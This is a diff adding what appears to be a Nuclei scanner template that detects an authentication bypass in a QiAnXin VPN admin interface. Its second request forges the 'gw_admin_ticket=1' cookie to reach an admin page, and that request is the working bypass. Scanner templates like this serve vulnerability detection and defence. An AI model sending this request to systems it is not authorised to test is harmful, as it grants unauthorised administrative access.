@@ -1,0 +1,33 @@
+id: qiannxin-vpn-admin-bypass
+info:
+  name: QiAnXin VPN Admin Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: authentication-bypass
+http:
+  - raw:
+      - |
+        GET /admin/group/x_group.php?id=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - len(body) == 0
+  - raw:
+      - |
+        GET /admin/group/x_group.php?id=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: gw_admin_ticket=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "group/group_action.php"
+        part: body
